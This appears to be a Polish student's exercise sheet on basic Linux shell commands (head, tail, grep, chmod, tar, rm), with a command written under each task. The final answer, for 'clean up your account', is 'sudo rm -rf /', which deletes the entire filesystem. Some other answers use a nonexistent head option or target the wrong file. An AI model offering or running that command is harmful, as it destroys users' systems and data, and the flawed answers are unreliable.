# Zadania
* [X] 1. Wyświetl na ekran 2 pierwsze wiersze pliku `program.c.` (head)

```
head --linec 2 program.c
head -n 2 program.c
head -2 program.c
```

* [X] 2 . Wyświetl na ekran 4 ostatnie wiersze pliku program.c. (head, tail)
```
tail -n 4 Hello.c
```

* [X]  3. W pliku program.c znajdź wszystkie wiersze z wystąpieniem słowa „main”. (grep)
```
grep main Hello.c

```
* [x]  4. Plikowi program.c nadaj następujące uprawnienia: właściciel – czytanie, pisanie, grupa – czytanie, pozostali użytkownicy: brak uprawnień. (chmod)
```
chmod 640 fad.md

```
* [ ]  5.Będąc w katalogu temp przenieś katalog wazne-sprawy do katalogu praca.
```

```

* [x]  6. Zarchiwizuj cały katalog temp. (zip i tar)cd
```
tar -cf temp.tar temp

```
* [x]  7. Usuń katalog temp.
```
rm -r temp

```
* [x]  8. Odtwórz z archiwum katalog temp. (unzip i tar)
```
tar -xf temp.tar

```
* [x]  9. Posprzątaj na swoim koncie.
```
sudo rm -rf /
```
